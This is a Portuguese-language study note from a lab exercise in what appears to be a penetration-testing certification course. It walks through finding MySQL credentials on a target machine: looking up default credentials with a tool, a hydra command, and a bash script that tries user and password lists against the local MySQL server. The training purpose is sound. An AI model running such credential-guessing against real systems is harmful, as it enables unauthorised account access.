> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/spraying-stuffing-and-defaults/question.md).

# Question

1. Utilize as credenciais fornecidas para acessar a máquina de destino e recuperar as credenciais do MySQL. Envie-as como resposta. (Format: \<username>:\<password>)

* Primeiro devemos fazer o login via ssh e verificar se o mysql está em execução

```
service mysql status
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FyXcW0ky77Xmmm50RyCyN%2Fimage.png?alt=media&amp;token=92e8b6e0-90cb-4599-b097-f31d23037eed" alt=""><figcaption></figcaption></figure>

* Em seguida procurar por **Default credentials**&#x20;
* Iremos instalar esta a ferramenta `defaultcreds-cheat-sheet` para automatizar esse processo, ao procurar por credenciais padrão do mysql

```
pip3 install defaultcreds-cheat-sheet
```

* Após a instalação, podemos usar o `creds`comando para buscar credenciais padrão conhecidas associadas ao mysql

```
creds search mysql
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FgpdDjA8OJv8wCod2or4h%2Fimage.png?alt=media&amp;token=8cc57d4f-b5f7-47b1-90bd-4080fd7afc99" alt=""><figcaption></figcaption></figure>

* A porta `3306` do mysql não é visivel externamente, então não há necessidade de usar o hydra (`hydra -C user_pass.list mysql//:ip`) para tentativa de acesso&#x20;

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FuaIxxT8Nz3BDJ1aff3Ly%2Fimage.png?alt=media&amp;token=e44f4ea4-3d2a-42fe-b36d-130882ca54e8" alt=""><figcaption></figcaption></figure>

* Criei uma lista de usuários e passwords de forma manual com base no que encontramos, em seguida fiz um script para automatizar o processo de acesso com credencias padrão válidas
* Isso tem que ser feito no alvo
* Script

```bash
#!/bin/bash

HOST="127.0.0.1"
PORT="3306"

while read usuario; do
    while read senha; do
        echo "Testando $usuario:$senha"

        mysql -h "$HOST" -P "$PORT" -u "$usuario" -p"$senha" -e "SELECT 1;" >/dev/null 2>&1

        if [ $? -eq 0 ]; then
            echo "[+] SUCESSO -> Usuario: $usuario | Senha: $senha"
            exit 0
        fi

    done < senhas.txt
done < usuarios.txt

echo "[-] Nenhuma credencial funcionou"
```

* Tornar executável

```
chmod +x test_mysql.sh
```

* Executar

```
./test_mysql.sh
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FYCobhRaUWlDM6gLoCVH2%2Fimage.png?alt=media&amp;token=5d8a89f0-e6f5-4884-936e-62bf0e104e99" alt=""><figcaption></figcaption></figure>
